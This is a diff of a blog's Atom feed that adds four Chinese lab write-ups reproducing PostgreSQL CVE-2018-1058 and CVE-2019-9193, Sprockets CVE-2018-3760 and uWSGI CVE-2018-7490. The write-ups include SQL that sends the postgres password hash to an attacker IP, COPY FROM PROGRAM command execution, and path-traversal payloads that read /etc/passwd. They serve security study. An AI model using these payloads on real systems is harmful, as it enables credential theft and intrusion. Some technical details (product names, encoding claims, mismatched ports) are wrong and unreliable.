@@ -6,7 +6,7 @@
   <link href="https://encr.cc/atom.xml" rel="self"/>
   
   <link href="https://encr.cc/"/>
-  <updated>2021-11-18T09:01:31.107Z</updated>
+  <updated>2021-11-18T15:18:22.356Z</updated>
   <id>https://encr.cc/</id>
   
   <author>
@@ -15,6 +15,102 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>PostgreSQL远程代码执行漏洞（CVE-2018-1058）</title>
+    <link href="https://encr.cc/2021/11/18/PostgreSQL%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1058%EF%BC%89/"/>
+    <id>https://encr.cc/2021/11/18/PostgreSQL%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-1058%EF%BC%89/</id>
+    <published>2021-11-18T14:45:14.000Z</published>
+    <updated>2021-11-18T15:18:22.356Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="PostgreSQL远程代码执行漏洞（CVE-2018-1058）"><a href="#PostgreSQL远程代码执行漏洞（CVE-2018-1058）" class="headerlink" title="PostgreSQL远程代码执行漏洞（CVE-2018-1058）"></a>PostgreSQL远程代码执行漏洞（CVE-2018-1058）</h1><blockquote><p>参考：<a href="https://blog.csdn.net/qq_33020901/article/details/79467114">https://blog.csdn.net/qq_33020901/article/details/79467114</a></p></blockquote><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>Ubuntu 21.04 (安装了Docker-compose) <ul><li>192.168.9.9</li></ul></li><li>Kali （攻击机）<ul><li>192.168.2.17</li></ul></li><li>vulhub靶场<ul><li>账号密码：vulhub:vulhub</li></ul></li></ul><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>先以普通用户登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">psql <span class="hljs-comment">--host 192.168.9.9 --username vulhub</span><br></code></pre></td></tr></table></figure><p>然后登录之后执行语句并退出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> public.array_to_string(anyarray,text) <span class="hljs-keyword">RETURNS</span> TEXT <span class="hljs-keyword">AS</span> $$<br>    <span class="hljs-keyword">select</span> dblink_connect((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;hostaddr=192.168.2.17 port=8888 user=postgres password=chybeta sslmode=disable dbname=&#x27;</span><span class="hljs-operator">||</span>(<span class="hljs-keyword">SELECT</span> passwd <span class="hljs-keyword">FROM</span> pg_shadow <span class="hljs-keyword">WHERE</span> usename<span class="hljs-operator">=</span><span class="hljs-string">&#x27;postgres&#x27;</span>))); <br>    <span class="hljs-keyword">SELECT</span> pg_catalog.array_to_string($<span class="hljs-number">1</span>,$<span class="hljs-number">2</span>);<br>$$ <span class="hljs-keyword">LANGUAGE</span> <span class="hljs-keyword">SQL</span> VOLATILE;<br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5.png" alt="执行语句"></p><p>然后在攻击机进行监听5433，<code>nc -lvvp 5433</code>，等待超级用户触发</p><p>在靶机里执行<code>docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub</code>，导出数据库内容</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E6%A8%A1%E6%8B%9F%E8%B6%85%E7%BA%A7%E7%94%A8%E6%88%B7%E8%B0%83%E7%94%A8ps_dump.png" alt="模拟超级用户调用ps_dump"></p><p>然后监听成功</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/%E7%9B%91%E5%90%AC%E6%88%90%E5%8A%9F.png" alt="监听成功"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>PostgreSQL 7.3后引入了<code>schema</code>的概念，称之为模式或者架构，允许用户在独立的命名空间中创建不同的对象（比如table，function）。在默认情况下，比如刚刚创建的一个数据库，都会有默认的一个<code>public</code>模式，在不做其他操作或者设定的情况下，诸如查询等操作都是在这个<code>public</code>中进行查询。</p><p>由于采用了独立的命名空间，因此在用户进行查询时，倘若涉及到对相同名字但在不同<code>schema</code>中的对象操作时，必然需要考虑一定的顺序。在PostgreSQL 9.6.7的官方文档中，<a href="https://docs.postgresql.fr/9.6/pg96.pdf">search_path (string)</a>说明了相关场景中的相应匹配动作</p><ul><li>首先适配原则，第一个找到的object被使用</li><li>名为$user的schema由SESSION_USER决定</li><li>如果<code>pg_catalog</code>不在path中则会最先查找它，如果在path中则按照指定顺序查找</li></ul><p>PostgreSQL在对第3点的实现上出现了<code>Design Error</code>(securityfocus的分类)，造成了代码执行漏洞。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><code>postgresql</code></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;PostgreSQL远程代码执行漏洞（CVE-2018-1058）&quot;&gt;&lt;a href=&quot;#PostgreSQL远程代码执行漏洞（CVE-2018-1058）&quot; class=&quot;headerlink&quot; title=&quot;PostgreSQL远程代码执行漏洞（CVE-201</summary>
+      
+    
+    
+    
+    <category term="漏洞复现" scheme="https://encr.cc/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="漏洞复现" scheme="https://encr.cc/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PostgreSQL高权限命令执行漏洞（CVE-2019-9193）</title>
+    <link href="https://encr.cc/2021/11/18/PostgreSQL%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-9193%EF%BC%89/"/>
+    <id>https://encr.cc/2021/11/18/PostgreSQL%E9%AB%98%E6%9D%83%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-9193%EF%BC%89/</id>
+    <published>2021-11-18T14:45:03.000Z</published>
+    <updated>2021-11-18T15:18:23.920Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="PostgreSQL-高权限命令执行漏洞（CVE-2019-9193）"><a href="#PostgreSQL-高权限命令执行漏洞（CVE-2019-9193）" class="headerlink" title="PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）"></a>PostgreSQL 高权限命令执行漏洞（CVE-2019-9193）</h1><h2 id="0X00漏洞描述"><a href="#0X00漏洞描述" class="headerlink" title="0X00漏洞描述"></a>0X00漏洞描述</h2><p>PostgreSQL是一个功能强大对象关系数据库管理系统(ORDBMS)。由于9.3增加一个“COPY TO/FROM PROGRAM”功能。这个功能就是允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令</p><p>从9.3 版本开始，PostgreSQL实现了“COPY TO/FROM PROGRAM”这个新的功能，它允许数据库的超级用户以及“pg_read_server_files”组用户执行任意的操作系统命令。这意味着在数据库超级用户角色与运行此数据库的操作系统用户角色之间没有进行适当的权限的分离。</p><p>由于这个漏洞介于权限提升和任意代码执行之间，它需要一些前提权限，这些权限可以是通过认证正常的登录PostgreSQL也可以是通过SQL注入获得与PostgreSQL交互的途径。需要再一次说明的是，上述两种情形下都需要用户是一个超级用户或者是“pg_read_server_files”组用户。</p><h2 id="0x01影响版本"><a href="#0x01影响版本" class="headerlink" title="0x01影响版本"></a>0x01影响版本</h2><p>9.3-11.2</p><h2 id="0x02环境搭建"><a href="#0x02环境搭建" class="headerlink" title="0x02环境搭建"></a>0x02环境搭建</h2><p>vulhub下载地址：<a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a></p><p>启动存在漏洞的环境：<code>docker-compose up -d</code></p><h2 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h2><p>启动环境后，使用工具进行连接或者用其他方法，这里我用的<code>Navicat</code>数据库初始账号密码为<code>postgres/postgres</code></p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20210918112340819.png" alt="image-20210918112340819"></p><h3 id="执行删除想保存命令但是存在的表"><a href="#执行删除想保存命令但是存在的表" class="headerlink" title="执行删除想保存命令但是存在的表"></a>执行删除想保存命令但是存在的表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> cmd_exec;<br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20210918112557185.png" alt="image-20210918112557185"></p><h3 id="创建保存命令的表"><a href="#创建保存命令的表" class="headerlink" title="创建保存命令的表"></a>创建保存命令的表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> cmd_exec(cmd_output text);<br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20210918112633968.png" alt="image-20210918112633968"></p><h3 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h3><p>这里主要通过<code>COPY FROM PROGRAM</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">COPY</span> cmd_exec <span class="hljs-keyword">FROM</span> PROGRAM <span class="hljs-string">&#x27;id&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20210918112732332.png" alt="image-20210918112732332"></p><p> 查询该表</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20210918112800373.png" alt="image-20210918112800373"></p><p>执行``whoami`</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20210918112830920.png" alt="image-20210918112830920"></p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20210918112848438.png" alt="image-20210918112848438"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;PostgreSQL-高权限命令执行漏洞（CVE-2019-9193）&quot;&gt;&lt;a href=&quot;#PostgreSQL-高权限命令执行漏洞（CVE-2019-9193）&quot; class=&quot;headerlink&quot; title=&quot;PostgreSQL 高权限命令执行漏洞（C</summary>
+      
+    
+    
+    
+    <category term="漏洞复现" scheme="https://encr.cc/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="漏洞复现" scheme="https://encr.cc/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Rudy On Rails任意文件读取漏洞CVE-2018-3760</title>
+    <link href="https://encr.cc/2021/11/18/Rudy%20On%20Rails%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2018-3760/"/>
+    <id>https://encr.cc/2021/11/18/Rudy%20On%20Rails%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2018-3760/</id>
+    <published>2021-11-18T14:16:52.000Z</published>
+    <updated>2021-11-18T14:42:43.457Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="CVE-2018-3760漏洞复现"><a href="#CVE-2018-3760漏洞复现" class="headerlink" title="CVE-2018-3760漏洞复现"></a>CVE-2018-3760漏洞复现</h1><h2 id="0x00-漏洞介绍"><a href="#0x00-漏洞介绍" class="headerlink" title="0x00 漏洞介绍"></a>0x00 漏洞介绍</h2><p>​    Rudy On Rails 一款著名的Ruby Web框架，它使用链轮作为开发环境中的静态文件服务器。Sprockets是一个编译和分发静态资源文件的Ruby库</p><p>​    在Ruby 3.7.1和更低版本中，存在由辅助解码引起的路径遍历漏洞。攻击者可以使用%252e%252e/访问根目录并读取或执行目标服务器上的任何文件。</p><h2 id="0x01-漏洞原因"><a href="#0x01-漏洞原因" class="headerlink" title="0x01 漏洞原因"></a>0x01 漏洞原因</h2><p>​    Sprockets用来检查JavaScript文件的相互依赖关系，用以优化网页中的引入的JS文件，以避免加载不必要的JS文件。</p><p>​    <code>Sprockets 3.7.1</code>及之前版本中，存在一处因为二次解码导致的路径穿越漏洞</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><ul><li>4.0.0.beta7及更低版本</li><li>3.7.1及更低版本</li><li>2.12.4及更低版本</li></ul><h2 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h2><p>升级为最新版本</p><h2 id="0x04-复现漏洞"><a href="#0x04-复现漏洞" class="headerlink" title="0x04 复现漏洞"></a>0x04 复现漏洞</h2><p>使用环境</p><ul><li>墨者Ruby On Rails漏洞复现第一题</li><li>Windows</li></ul><p>先构造Payload爆出可访问目录</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211118200315861.png" alt="image-20211118200315861"></p><p>随便选择一个读取到passwd文件</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211118200520895.png" alt="image-20211118200520895"></p><blockquote><p>%252e是%2f的二次Url编码</p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;CVE-2018-3760漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2018-3760漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2018-3760漏洞复现&quot;&gt;&lt;/a&gt;CVE-2018-3760漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;0x00-</summary>
+      
+    
+    
+    
+    <category term="漏洞复现" scheme="https://encr.cc/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="漏洞复现" scheme="https://encr.cc/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>uWSGI 任意文件读取CVE-2018-7490</title>
+    <link href="https://encr.cc/2021/11/18/uWSGI%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-7490/"/>
+    <id>https://encr.cc/2021/11/18/uWSGI%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96CVE-2018-7490/</id>
+    <published>2021-11-18T14:16:49.000Z</published>
+    <updated>2021-11-18T14:44:10.399Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="uWSGI-CVE-2018-7490漏洞"><a href="#uWSGI-CVE-2018-7490漏洞" class="headerlink" title="uWSGI CVE-2018-7490漏洞"></a>uWSGI CVE-2018-7490漏洞</h1><h2 id="0x00-漏洞介绍"><a href="#0x00-漏洞介绍" class="headerlink" title="0x00 漏洞介绍"></a>0x00 漏洞介绍</h2><p>​    uWSGI是一个Web服务器，它实现了WSGI、uWSGI、HTTP等协议。Nginx中的HttpUwsgiModule的作用是与uWSGI服务器进行交行。</p><p>​    WSGI是一种Web服务器网关接口。它是一个Web服务器（如nginx，uWSGI等服务器）与web应用（如用Flask框架写的程序）通信的一种规范。</p><p>​    </p><h2 id="0x01-漏洞原因"><a href="#0x01-漏洞原因" class="headerlink" title="0x01 漏洞原因"></a>0x01 漏洞原因</h2><p>​    <code>    uWSGI PHP Plugin &lt; 2.0.17</code>没能妥善处理<code>DOCUMENT_ROOT</code>检测的<code>--php-docroot</code>选项，导致攻击者可以通过带有‘…’序列的特制URL请求，恶意查看系统上的任意文件。</p><h2 id="0x02-受影响版本"><a href="#0x02-受影响版本" class="headerlink" title="0x02 受影响版本"></a>0x02 受影响版本</h2><p>uWSGI 2.0.17之前的版本</p><h2 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h2><p>更新至最新版</p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>使用环境</p><ul><li>buuoj.cn</li></ul><p>启动环境，打开就是PHPinfo，可以看到uWSGI</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211118201259003.png" alt="image-20211118201259003"></p><p>将../../进行url编码，构造Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/..%2f%2f/etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211118201502903.png" alt="image-20211118201502903"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;uWSGI-CVE-2018-7490漏洞&quot;&gt;&lt;a href=&quot;#uWSGI-CVE-2018-7490漏洞&quot; class=&quot;headerlink&quot; title=&quot;uWSGI CVE-2018-7490漏洞&quot;&gt;&lt;/a&gt;uWSGI CVE-2018-7490漏洞&lt;/</summary>
+      
+    
+    
+    
+    <category term="漏洞复现" scheme="https://encr.cc/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="漏洞复现" scheme="https://encr.cc/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>SSTI注入分析与防御</title>
